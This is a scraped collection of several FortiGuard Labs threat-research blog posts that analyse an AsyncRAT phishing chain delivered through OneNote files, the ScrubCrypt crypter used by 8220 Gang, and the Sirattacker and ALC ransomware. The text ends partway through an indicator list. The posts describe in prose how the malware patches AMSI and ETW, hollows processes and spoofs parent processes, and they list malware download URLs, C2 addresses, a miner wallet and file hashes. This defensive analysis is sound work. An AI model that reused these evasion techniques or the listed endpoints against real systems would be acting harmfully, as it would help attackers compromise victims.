delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-ransomware-roundup"
  },
  {
    "title": "Microsoft OneNote File Being Leveraged by Phishing Campaigns to Spread Malware",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully control the victim’s computerSeverity level:Critical A couple of phishing campaigns that recently caught FortiGuard Labs’ attention were found sending phishing emails with attached malicious Microsoft OneNote files to spread the AsyncRAT malware. As a cybersecurity researcher, I conducted an in-depth analysis of these phishing campaigns, tracing the entire process from the initial phishing email to the final deployment of AsyncRAT, which gains complete control of the victim's device. In this analysis, you will learn about the contents of this attack, such as what kind of phishing email starts the campaign, how a malicious Microsoft OneNote file is involved in the campaign, how it is leveraged to download and executemalicious fileson the victim’s device, the kinds of techniques that enable it to evade detection and analysis, and how the malware – AsyncRAT – communicates with its C2 server, including what control commands it supports to fully control the victim’s device. The following flowchart roughly describes the entire process of how the phishing campaign delivers and executes AsyncRAT: Figure 1.1 shows the captured phishing email in Outlook. As you can see, the email’s Subject has been marked as SPAM by our FortiMail service to alert the recipient to potential risks. The phishing email is disguised as an urgent shipment notification from a well-known delivery company. It asks the recipient to confirm whether a shipping address is correct by opening the attached Microsoft OneNote file, “SHIPPING_DOC.one”. Microsoft OneNote is a digital note-taking software provided as part of the Microsoft Office suite. It allows users to create notes that include texts, pictures, tables, and drawings. It also has a feature that allows users to insert file attachments into OneNote, including executable files (click menu “Insert” -> “File Attachment”). The left side of Figure 2.1 shows the OneNote file attached to the phishing email after being opened in the Microsoft OneNote program. It contains a button that lures the intended victim into clicking it to view the content. This button-like image conceals four identical BAT files that can be seen on the right side of Figure 2.1 when the button picture is moved out of the way. When double-clicking the button-like image, one of the inserted BAT files (viewn.bat) is executed. A batch file (.BAT) is a script containing a group of commands executed together by a command-line interpreter (like cmd.exe). The code in the viewn.bat file is similar to the following: Once the victim double-clicks the picture in the Microsoft OneNote program, a piece of Windows PowerShell script is also executed that downloads another BAT file called “Io.bat”. It is launched using the command “start Io.bat”. Figure 2.2 below shows the content of Io.bat in an editor. Io.bat’s primary task is similar to the previously described “viewn.bat”. It runs a Windows PowerShell script that downloads a ZIP archive file called “view.zip” onto the victim’s device. The script then decompresses an EXE file (view.exe) from the ZIP archive and executes it using the “start view.exe” command. Malware often employs complex methods to evade detection and analysis by security researchers. In this case, the downloaded view.exe is not the malware payload but a dropper of another batch file (“fresh.bat”). Figure 2.2 shows several screenshots of view.exe in a debugger. View.exe calls Windows-native APIs to load a resource called “CABINET” from the “RCData” folder in its RESOURCE section. It includes compressed data in a CAB file type. View.exe decompresses the resource data and saves it into the file “%temp%\\IXP004.TMP\\fresh.bat”. It then calls the API CreateProcessA() to run fresh.bat with the command “cmd /c fresh.bat”. Fresh.bat is obfuscated, as shown in Figure 2.4. Its commands are split into a branch of variables that are combined at the bottom before executing. The purpose of the combined commands is to copy Windows PowerShell.exe into the current folder and rename it as “fresh.bat.exe”. It then uses this to execute the piece of PowerShell code shown below. The PowerShell code is lightly obfuscated, like the reversed function names. However, it is easy to understand its code with the added comments. This segment of PowerShell code reads a chunk of strings that start with “:: “ from fresh.bat, a transformed PE file, as shown in Figure 2.4. (By the way, lines starting with “::” are comments in batch files (.BAT).) It then dynamically decodes, decrypts, and decompresses a PE file into memory and executes it by invoking its EntryPoint() function. Although it is fileless, it is originally named tmp72AF.tmp according to its compile information. Figure 2.5 shows a screenshot of the process tree, which explains the workflow from opening the OneNote file to running fresh.bat and fresh.bat.exe to executing the PowerShell code. It also shows the relationship between relevant processes. The fileless .Net PE file (origin name “tmp72AF.tmp”) is a malware loader program. It decrypts two executable modules from its .Net Resource section and launches them. 1.     Anti-analysis In the Main() function, the malware calls the APIs CheckRemoteDebuggerPresent() and IsDebuggerPresent() to check if it is running in a debugger. It then checks the value of that assessment in Debugger.IsAttached. If either of them is “true”, the program exits immediately. Windows provides a system module called “amsi.dll“ (Antimalware Scan Interface) that has an export function called AmsiScanBuffer(). This can scan a data buffer for malware or malicious content. Tmp72AF.tmp can override the API function to have it always return a code of 0x80070057, which means \"the parameter is incorrect\". This override technique prevents the API AmsiScanBuffer() from detecting malware. To do this, it needs to call the API VirtualProtect() to set the memory of AmsiScanBuffer() to writable. Figure 3.1 illustrates a comparison between the original API AmsiScanBuffer() and the override API. 2.     Decrypt two executable modules from the .Net Resource section As mentioned earlier, there are two modules in the .Net Resource section to be decrypted. Figure 3.2 displays the .Net Resource section with those two resources, “payload.exe” and “runpe.dll”. These two resources are encrypted and compressed using GZip compression. They are decrypted into the memory of the running processes (fresh.bat.exe, the copied PowerShell.exe). As their names suggest, the .Net program uses “runpe.dll” to launch “payload.exe”. The below figure shows when tmp72AF.tmp invokes the runpe.RunPE.ExecutePE() method of runpe.dll, where string3 is “runpe.RunPE”, string4 is “ExecutePE”, and array3 holds the data of the decrypted payload.exe. ExecutePE() launches payload.exe in a newly-created thread by invoking its entry point function. Payload.exe is a 64-bit console program that performs process hollowing to implant the AsyncRAT client into the target process notepad.exe. The trick of payload.exe is leveraging the “syscall” instruction every time it needs to call the undocumented APIs. In addition, all constant strings are encrypted and only decrypted before being referenced. This allows it to evade anti-virus software detection, creating challenges for security analysts. Below is a list of syscall ids and the corresponding APIs used by payload.exe. The following code snippet of “syscall” is used for calling the API NtOpenProcess(), where eax should be 0x26. To maintain persistence of the target process on the victim's device, payload.exe disguises the target process to appear as if it was started by the victim—which means its parent process is explorer.exe. To do this, it retrieves the process information of explorer.exe from the current process list by calling API NtQuerySystemInformation() using SystemProcessInformation as the value of the parameter SYSTEM_INFORMATION_CLASS. It then calls the API NtOpenProcess() to retrieve the process handle of explorer.exe. It uses this handle to set the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute to explorer.exe using the API UpdateProcThreadAttribute(). This allows child processes to inherit this attribute. Meanwhile, that API function fills an attribute list with the inherited information from explorer.exe. As you can see in Figure 4.1, the malware was about to call the API CreateProcessW() with a full path of notepad.exe with the created flag of CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED and lpStartupInfo with the inherited explorer.exe information. After its creation, the notepad.exe process becomes a sub-process of explorer.exe as if it’s launched by the victim. Using Process Explorer software, we can see that the created notepad.exe process is now a sub-process of explorer.exe, and its status is “Suspended” (without “Running”), as shown in Figure 4.2. Subsequently, it leverages “syscall” to invoke APIs, such as NtAllocateVirtualMemory() and NtWriteVirtualMemory(), for allocating memory in the target process (notepad.exe). It transfers some data to the just-allocated memory containing the encrypted AsyncRAT client and a piece of ASM code in charge of decrypting and deploying the AsyncRAT client into the target process notepad.exe. It then proceeds to create an APC object and add it to the APC queue of a thread of notepad.exe by using the API NtQueueApcThread() with a thread function parameter pointing to the copied ASM code. Finally, the API NtResumeThread() is called to resume the execution of the previously suspended notepad.exe process. AsyncRAT is a Remote Access Trojan (RAT) that allows attackers to gain control of a victim's computer system. Its features include stealing sensitive data, monitoring user activity, and executing commands remotely on the infected device. AsyncRAT is written in C# language and runs in a .Net Framework environment. Since it is fileless in this phishing campaign, I needed to dump it from the notepad.exe process for deep analysis. Once AsyncRAT starts, it decrypts a group of setting values in its Main() function, as shown in Figure 5.1. The setting values for the captured AsyncRAT indicate: A crypto key was used to decrypt the following setting values: Once set, the AsyncRAT is ready to send information collected from the victim’s device to its C2 server and then wait for control commands from the C2 server to remotely control it. For secure communications, AsyncRAT uses the SSL protocol to deliver its packets. Below is a screenshot of the first packet that AsyncRAT sends to its C2 server before sending it over SSL. The data of the packet is saved in a unique format. All packets between AsyncRAT and its C2 server are in the same format, including value type, value name, and value. From the packet, I extracted the information in the following table as an example to explain the packet format. The value of “Packet” is the control command, where the “ClientInfo” command is used to send basic information about both the victim’s device and the AsyncRAT client to the C2 server, like a registration packet. AsyncRAT also supports many other control commands to control the victim’s machine. Most of the control commands AsyncRAT provides: \"blankscreen+\", \"blankscreen-\", \"botKiller\", \"BotKiller\", \"chat\", \"chat-\", \"chatExit\", \"chatWriteInput\", \"ClientInfo\", \"close\", \"disableDefedner\", \"dos\", \"dosAdd\", \"Error\", \"executeDotNetCode\", \"fileManager\", \"GetXmr\", \"keyLogger\", \"limeUSB\", \"Logs\", \"pcOptions\", \"Ping\", \"Ping!)\", \"plugin\", \"pong\", \"processManager\", \"Received\", \"remoteDesktop\", \"reportWindow\", \"reportWindow-\", \"restart\", \"savePlugin\", \"sendFile\", \"sendMemory\", \"sendMessage\", \"sendPlugin\", \"shell\", \"shellWriteInput\", \"socketDownload\", \"thumbnails\", \"thumbnailsStop\", \"torrent\", \"uac\", \"uninstall\", \"visitURL\", \"webcam\", \"xmr\", and more. Features that AsyncRAT supports: Backdoor Access:  The attacker can remotely perform whatever activities they want within the infected system. Run Executable Files: The attacker can transfer any executable file and run it on the victim’s device. Credential Stealing: AsyncRAT can grab various user credentials from different applications, including Chrome, Firefox, Edge, and Internet Explorer. Remote Desktop Control: The attacker can achieve remote desktop control of the infected system. File Manager: AsyncRAT permits attackers to have full access to files on a targeted computer. They can move, delete, copy, or modify files. File Searcher: The attacker can search files on the infected system. The picture below shows how it starts the File Searcher feature on the AsyncRAT server. Process Manager: The attacker can check and kill running processes on the victim’s device. Keylogging: The malware has a keylogger function that can keep track of all keystrokes made on the victim’s device, monitoring both offline and online activities. DDoS Attacks: AsyncRAT can launch widespread DDoS attacks from multiple systems under its control to target specific websites. Audio Recording: The malware can unmute the microphone on infected machines to record audio. Webcam Control: AsyncRAT can enable the victim’s webcam to capture images and video. I have explained how the phishing campaign started with a SPAM email, how a Microsoft OneNote file is involved, and what BAT files are leveraged to download more malicious files (like Io.bat, view.zip). We also explored the anti-analysis techniques it uses to evade being detected and analyzed by security researchers. I elaborated on how a complicated strategy is used to protect its code, such as loading executable files from the PE Resource section, always keeping the key modules fileless, and creating a target notepad.exe process on behalf of explorer.exe. Finally, I demonstrated what the packet format looks like, what essential information AsyncRAT can collect from the victim’s device, and what control commands AsyncRAT supports to fully control the victim’s device. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs and C2 server are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail has recognized the phishing email as SPAM. FortiGuard Antivirus service detects the attached OneNote file, as well as the follow-up downloaded lo.bat file and view.zip files, with the AV signatures “MSOffice/Agent.OXZ!tr“, “BAT/Agent.OXZ!tr”, and “MSOffice/Agent.PLI!tr”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. URLs: https://transfer.sh/get/IKRQSd/view.zip https://transfer.sh/get/sxSJuL/lo.bat C2 Server List: 95.216.102.32:8808 Relevant Sample SHA-256: [SHIPPING_DOC.one] 305D7962894C83EBFCC863FE129180F20E6144F1F59D70971249D14E6D178FA4 [lo.bat] DE5331B71DC535F75DADE1FBD042120FE9732FA851700A54D5C423B45145C929 [view.zip] 66FBD626EAC4B285F093E5FBFF484DAA95D270E981EDA051836B5EE47EA7A01B Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. email phishing,phishing,malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/microsoft-onenote-file-being-leveraged-by-phishing-campaigns-to-spread-malware"
  },
  {
    "title": "Reduce, Reuse, Recycle: Bad Actors Practicing the Three Rs",
    "content": "FortiGuard Labs Threat Research Malware has a way of grabbing all the attention in the media and keeping companies on their toes. The world watched as wipers were deployed to Ukrainian organizations after the Russian invasion of Ukraine, which marked the beginning of a time of instability that included ransomware and InfoStealers, as well. Adding to the negative cybersecurity load of 2022, the contemporary version of ransomware celebrated its 10-year anniversary. And if that weren’t enough, our FortiGuard Labs researchers have seen that a cybercriminal, like any sensible businessperson, are big proponents of getting the most out of their resources. You might say they’re practicing the reduce, reuse, recycle principles, but instead of being focused on environmental concerns, they’re retrofitting code to enable more successful criminal outcomes. Apparently, it’s not just diamonds that are forever – so are certain strands of malware.In the second half of 2022,our researchers saw the resurgence of familiar names in the malware, wiper, and botnet space - including Emotet and GandCrab, to name a few. The top five ransomware families, out of a total of 99 detected, accounted for about 37% of all ransomware activity in the second half of 2022. The most prominent malware was GandCrab, a RaaS threat that surfaced in 2018. FortiGuard Labs also investigated a group of Emotet variations to assess their propensity for borrowing and recycling code. According to the research, Emotet has undergone significant diversification, with variants dividing into about six different \"species\" of malware. Not content to simply automate threats, cyber-attackers aggressively improve upon successful innovations. Cyber adversaries have an entrepreneurial spirit and are constantly seeking for ways to increase the value of current investments and knowledge in attack operations to increase their effectiveness and profitability. Reusing code allows hackers to build on previously successful results while iteratively improving their attacks and getting past defensive barriers. In fact, in our analysis of the most common malware for the second half of 2022, we saw that the bulk of the top ranks were occupied by malware that was more than a year old. Some of them—like Lazurus—have existed for more than 10 years and are pillars of the history of the internet. Along with reusing code, attackers are maximizing opportunities by using well-known threats and existing infrastructure. For instance, if we look at botnet threats by pervasiveness, many of the top botnets aren’t novel. Mirai and Gh0st.Rat has continued to dominate across all geographies, which isn’t surprising.  Among the top five observed botnets, only RotaJakiro was created in the last couple of years. Although there’s a tendency to disregard more recent risks as history, businesses in all industries must maintain their vigilance. Such \"vintage\" botnets remain in wide circulation because they continue to be highly effective. Because there is a return on investment, clever hackers will continue to exploit current botnet infrastructure and transform it into increasingly persistent versions using highly specialized techniques. In particular, the manufacturing sector, Managed Security Service Providers (MSSP), and the telco/carrier sector were all major targets of Mirai in the second half of 2022. This demonstrates an intensive effort of criminals to target those sectors with tried-and-true techniques. It can be difficult for enterprises to keep up with constantly changing threats. The reuse of code and modularization made possible by a burgeoning Crime-as-a-Service ecosystem underscores the value of prompt security services that can help enterprises fend off threats with AI-powered, coordinated defense. Moreover, companies can achieve quicker detection and enforcement across the full attack surface if there is integration across all security devices, thereby lowering their overall risk posture. Beyond technology, cybersecurity strategy really comes down to people. It takes a global team effort with robust, trustworthy relationships and collaboration among cybersecurity participants across public and commercial organizations and sectors to successfully disrupt cybercriminal supply chains. Cyber awareness and hygiene training must be a cornerstone of any company – this must extend to all employees, not just those in IT or security functions. Anestimated 80% of organizationsreported last year that they’d suffered one or more breaches due to a lack of cybersecurity skills and awareness. The latter half of 2022 was interesting, to say the least. Understanding the trends from this period will help you better understand how to keep your companies operating safely. According to what we have observed over the past six months, we cannot dismiss older threats. They are still actively evolving and searching for both unpatched places and fresh vulnerabilities that will enable them to spread. Companies that use the above information and best practices will be better prepared to face what’s next on the threat horizon. Learn moreabout the latest cyber threat trends in the semiannual Global Threat Landscape Report from FortiGuard Labs. Cybercriminals,trends,malware,Cyber Awareness FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/bad-actors-resurrecting-old-tactics"
  },
  {
    "title": "Old Cyber Gang Uses New Crypter – ScrubCrypt",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Cryptojacks vulnerable systemsSeverity level:Critical Between January and February 2023, FortiGuard Labs observed a payload targeting an exploitable Oracle Weblogic Server in a specific URI. This payload extracts ScrubCrypt, which obfuscates and encrypts applications and makes them able to dodge security programs. It already has an updated version, and the seller’s webpage (Figure 1) guarantees that it can bypass Windows Defender and provide anti-debug and some bypass functions. We analyzed the malware injected into a victim’s system and, as part of our analysis, identified the threat actor as 8220 Gang using collected indicators. This mining group first appeared in 2017. The name “8220” comes from its original use of port 8220 for network communications. In this article, we will elaborate on the details of ScrubCrypt and other malware delivered by this crypter in the past. Based on our observations over the past two months, these attacks originate from 163[.]123[.]142[.]210 and 185[.]17[.]0[.]19. The attackers have targeted an HTTP URI, “wls-wsat/CoordinatorPortType,” which belongs to an Oracle Weblogic server. The corresponding traffic capture is shown in Figure 2. The attack attempts to download a PowerShell named “bypass.ps1”. The partial PowerShell script, “bypass.ps1,” shown in Figure 3, has had its main code and strings encoded to make it harder to be detected by AntiVirus solutions. After three rounds of adding constants, reversing, and Based64 decoding, we finally uncovered clear text. The first variable, “$c”, contains ScrubCrypt. The detail of this variable will be discussed in the next section. The rest of the variables, from “$d” to “$f”, are for AMSI and ETW evasion, which is executed by “iex” at the end of the attack. After decoding “$c”, we find the script for the next step, shown in Figure 4. It has another Base64-encoded code saved in the victim’s temp folder with the filename “OracleUpdate.bat” to masquerade as a normal system file. Once the fake “update” file is decoded and saved, it executes with the Windows style “hidden” to silently load ScrubCrypt. ScrubCrypt is a crypter used to secure applications with a unique BAT packing method. The batch file is shown in Figure 5. The encrypted data at the top can be split into four parts using backslash “\\”. The final two parts are the key and iv for AES CBC decryption.After Base64 decode, AES decryption, and unzip, we can finally see the code. The organized code in Figure 6 is a typical .NET Reflective Injection. In the last two lines of the code, the variable “$BmoFi” disables Event Tracing for Windows (ETW) by patching the EtwEventWrite function with 0xC3 (ret), and “$BbIpF” is used to invoke a .NET named “ScrubCrypt” for the final payload, shown in Figure 7. The .NET code first modifies the extension as null, checks to see if a debugger is attached, and checks the system’s operating system version to decide whether or not to proceed. It then gets the process ID to establish a melting file (self-delete) after execution, shown in Figure 8. Then, it determines whether the current user belongs to the Windows user group “BUILTIN\\Administrators” (RID: 0x220). If the user is not in that specific group, it decodes the “UAC” data from the “Resources” section and saves it to “C:\\Windows\\system32\\perfmon.exe”. The DLL file is shown in Figure 9. It is used to retrieve username information from the compromised endpoint. It then decodes the PowerShell command:“cmd /c timeout /t 3 /nobreak & “C:\\Windows\\System32\\perfmon.exe””to pause the command processor for three seconds, ignore any keystrokes, and execute the DLL. Next, it enumerates the driver in the system to bypass scans from Windows Defender using the command in Figure 10. For persistence, it grabs registry values from “Run” and “RunOnce” to determine if this .NET file is already set. If not, it saves the .NET file to a “Roaming” folder named “BSLkE.bat” and adds a registry value to run a VBS file with the content shown in Figure 11. Finally, it decodes data “P” from the “Resources” section using the XOR key in Figure 12 and unzips it. Then it loads the decoded data named “miner” in memory and invokes the payload, as shown in Figure 13. We collected several ScrubCrypt samples in February, and each payload is a little different. On 2/14, ScrubCrypt loads “miner” and invokes the process “explorer.exe” to start the miner process to server 45[.]142[.]122[.]11:8080, shown in Figures 14 and 15. This IP address and wallet were used for the 8220 Gang attack in January 2023. On 2/15, ScrubCrypt extracted “bat”, which unzipped its array data and used “InvokeMember” to execute “Eoengmvsg.dll”, shown in Figure 16. It decodes the three C2 servers and three port numbers shown in Figure 17. Once that victim device receives the C2 server’s packets, it downloads another three files from 79[.]137[.]203[.]156, shown in Figure 18. The first, “miner.bat”, is a ScrubCrypt BAT file. The other two files are compressed PE files: “plugin_3.dll” and “plugin_4.dll” (Figure 19). They exhibit behavior similar to that described inthis previous article. On 2/16, ScrubCrypt loaded a module also named “bat’, as shown in Figure 20, but the data for its unzip is from its “Resources” section. It communicates with the same C2 server, and downloads two files from 163[.]123[.]142[.]210. These files are also compressed PE files named “plugin_3.dll” and “plugin_4.dll”. They are identical to the files from 2/15 and start crypto miner activity using the same configuration, as shown in Figure 21. The crypto wallet address,46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ, and the server IP address used in Monero miner have all been used by the 8220 Gang in the past. It’s why we believe the whole attack was launched by this threat actor, although the port number used is no longer 8220. 8220 Gang is a well-known miner group that usually leverages public file-sharing websites and targets system vulnerabilities to infiltrate a victim’s environment. Within a very short time, it has evolved to use a newer crypter variant, “ScrubCrypt.” Below is its complete attack chain. ScrubCrypt includes evasion and encryption functions, making it harder for anti-virus programs to detect 8220 Gang activity. Users should be aware of this updated crypter and keep their systems patched. The malware described in this report are detected and blocked by FortiGuard Antivirus as: PowerShell/Agent.YX!tr BAT/ScrubCrypt.A!tr MSIL/ScrubCrypt.AHRI!tr MSIL/Agent.DUD!tr MSIL/Agent.AHZU!tr MSIL/GenKryptik.FYKQ!tr MSIL/GenKryptik.GGHT!tr MSIL/Agent.OBB!tr.dldr Riskware/CoinMiner The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the malicious URL and IP address. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. URLs: su-95[.]letmaker[.]top work[.]letmaker[.]top IP Address: 163[.]123[.]142[.]210 185[.]17[.]0[.]19 79[.]137[.]203[.]156 209[.]141[.]38[.]219 45[.]142[.]122[.]11 179[.]43[.]155[.]202 Files: d9e7d3dbb299f76bb8a84e3b72cc8e78e86ea90e2dc777cdcfd51dbd10657f47 179be54b3c2e29571fec9dcd16781eee3ce997c5352d9cce4834a10fc11d636b 20a8278b25d5c27e861dc5188f9ffd40fc45db4131245ce1020c6fa9909841d1 3422e84ca8e1ce5b106415d074667721772a7a8e9de3cd911665bad42145926c a9d0af5af4cebbcce59ad5ef823a8d0ec71147799692c03be784f9e1670467ca 84f8580343323b8534d2321c1b8789df544c4941e12d8dfa5a1fbcd201b97e72 15cc89335d137fde5c61e540cd1c77718653ed7f359b206aeb85f25e5928096a 57223450820cbe9cf5779083b7d85c440bb8b529505c55579bfcc5816bf5c80a 9e2ddef83a3043de6a1f655a556fe3eca522656ad5e6056dd92ad13fa354b32f 4d3be48fd3dde635cccd87a9925749c5a166e9b52026b5277883c7f3ab50c520 55ba36d2ee2c5359dec3a425d27df9c3fb1ddede8cef74fd0bd69d38434609fd 2ad4c954313fe912a64c4116bf7ec5cbd2e6e3a88979f7b7c2863ca21ffc9dd9 0159c3b4fdff4ba89ff9e56bf2cdcdc8aaaa35d1fa4661288225e3701f8569b5 b3ceead8490dd68c344d5b009a8bf17ed7d24499a9d66dc3493033b5696f6632 13a11140bc0c62fbc8a364f71dfdf91a3ef321bb8c9c212b3af5eb576488a95e 0767cfa1fb304ba5ef61d25ddc580cf82170b84e6a04c856e84c6ad3ad98dc92 922c114c3a7f69b3210624f3e267cfc330969d17c5813cd328557b1476ef1858 21326ecbb4cf7fef735e04f8e51efd7c861f883844e22050eab8615c7605b2f5 e6834bbc9946e79f8888d30e52ae72552c37f160a8e6ce3f56ae5a88ed190e91 d6150fd4d9616788fcb6f765ab5052669feaf90ac926ad42a59f3abf4871edb8 4e46e6ca8c993761238af82e33a98aee97e80a3c8c80d418fb410e9556788d97 a12c34fef1d6475d99aa9af2e8bf1fd55bca83982a0ee2a9131ffd9fd15cb2a7 b62ea075cfc99980488bc206cba24ffcd4faccd8b1a80aec27d9d444c430095d 283db6a012cb9183f45674cb43303fa9b6c9a7ebab41c821dc0cc122ad3bb43 Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. threat research,oracle,malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/old-cyber-gang-uses-new-crypter-scrubcrypt"
  },
  {
    "title": "Ransomware Roundup – Sirattacker and ALC",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Sirattacker and ALC ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Sirattacker is one of the latest Chaos ransomware variants. It was first released in the middle of February 2023. Several versions of Chaos ransomware builders are available in Dark Web underground networks, which allow anyone to generate Chaos ransomware with custom configurations. FortiGuard Labs previously published the following blogs on Chaos ransomware: Sirattacker ransomware is likely distributed as an Ethereum mining app because all samples include an Ethereum file icon, and some are even named “ETH [3-digit number].exe”. Another Chaos ransomware variant called “Bruh,” also masquerading as a cryptocurrency generator, was reported in the previous week. While there is no apparent connection between Sirattacker and Bruh ransomware, it’s a curious coincidence. Once the Sirattacker ransomware is executed, it encrypts files on the victim’s machine and adds random four-letter file extensions to their filenames. Older Chaos ransomware variants are known to overwrite files larger than 2,117,152 bytes with random bytes, which makes file recovery impossible (unless the affected files are properly backed up). In some cases, attackers demand a ransom payment, knowing that most files are unrecoverable. Luckily, Sirattacker ransomware samples appear to be generated using a newer Chaos ransomware generator, as larger files are encrypted instead of overwritten. Once files are encrypted, Sirattacker displays a ransom note on the Command Prompt. The ransomware then replaces the desktop wallpaper with its own. The new wallpaper contains an almost identical message to the ransom note and asks victims to contact the attacker by email. Currently, theBitcoinwallet the Sirattacker ransomware actor uses has no money left in it. However, the wallet shows that in the latest transaction, recorded on February 24, 2023, the attacker sent a small amount of Bitcoin (0.00150106) to another wallet. However, as of this writing, that wallet was holding a whopping 538.57136296 Bitcoin—worth more than $12 million. Over the last few months, the attacker appears to have systematically transferred Bitcoin in and out of the wallet. For example, on February 24, 2023, $35.13 worth of Bitcoin was deposited to the attacker’s wallet. That amount of Bitcoin was transferred to another wallet on the same day. Note that screenshots were edited to highlight the attacker’s transactions. While there is no evidence that those transactions are associated with the Sirattacker ransomware, it potentially indicates that the Sirattacker ransomware threat actor has been actively involved in other illicit activities over the past few months. ALC is a recently reported ransomware. It is known for a message aimed at “Russia and its counterpart” in its ransom note. FortiGuard Labs analyzed the ransomware and found it is much more than meets the eye. Information on the infection vector used by this group is not currently available. However, it is not likely to differ significantly from other ransomware groups. Once ALC ransomware runs, it creates several files on the victim machine’s Desktop. Note that some ALC ransomware samples do not create the AlcDif.exe file shown in the image below. RUS!.txt is a ransom note containing a message with incorrect word choices, indicating that the authors are not native English speakers. For example, “Decrypted” is likely meant to be “Encrypted,” and Russsia is a misspelling of “Russia.” Per the ransom note, ALC ransomware targets “Russia and its counterparts,” which may imply China, Iran, Belarus, and others. The ransom note asks the victim to contact the attacker on Telegram, an encrypted instant messaging app popular with cybercriminals. However, no contact information or ransom price is provided in the note. Some of the ALC ransomware samples create an executable file named AlcDif.exe. It is used to create a more sophisticated ransom note. Once the ransomware executes the file, it runs in full screen in a probable attempt to scare victims by imitating a lock screen. If the victim uses multiple monitors, the program only occupies the primary monitor. The program also “toggles” Task Manager. Task Manager gets disabled when the program is run for the first time. Running it again reenables it. This is the ransom note displayed by AlcDif.exe: Unlike the ransom note in the text file, this ransom screen provides a contact address, the attacker’s crypto wallet information, a ransom price, and a unique ID assigned to the victim. However, the ransom screen lacks coherence as the provided crypto wallet does not exist, and the QR code does not work. Also, the ransom screen lists a cryptocurrency ransom of 554 Monero (over $80,000 using the exchange rate on February 27th, 2023) even though a $2,000 price tag is listed under the QR code. Most importantly, ALC ransomware does not encrypt any files, classifying it as more of a scareware. However, the ransomware sets up cryptography (it generates a random value, hashes it, creates a GO cipher object for AES, encrypts the AES key using the hard-coded RSA public key, and writes the encrypted key in an ALCKEY file), enumerates files on the compromised machine, and saves a list of those files in a separate text file for each drive found (i.e., “C.txt” contains a list of files found in C drive). That evidence leads us to two possible conclusions: either the attacker tries to cheat money out of victims knowing full well the program does not encrypt files, or the program is still in beta. Fortinet customers are already protected from these malware variants through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Sirattacker ransomware variants with the following AV signatures: FortiGuard Labs detects known ALC ransomware variants with the following AV signatures: File-based IOCs: SHA256 Malware a80908bcd96a8df6070eb9a9c83739c8d95c34d7d81b890bacda91bb05c53267 Sirattacker ransomware b3be7cf75ded8a3dec4a78a9dcf32ff433ac5fa5743d5c27b77dd67f9d6a427b Sirattacker ransomware b8a277a731485717c01a7d20fb6af795fa823a219b9b01ee2f476889610a28da Sirattacker ransomware d4d7fb3c49feed626b24e5db8735547d7b244705342dcc301faafa0b9ac72bf1 Sirattacker ransomware e6de7531d2c7900ff73b30e33170fd7530fb7771518503c65203b1a419a8d11e Sirattacker ransomware 75b45fea6000b6cb5e88b786e164c777c410e11fdcf1ff99b66b43096223d734 Sirattacker ransomware bbc6a34b48a4c71a4d9c2ae2d8c975f3b6caf2e17b86057ccbcb6686d1d5a642 ALC ransomware 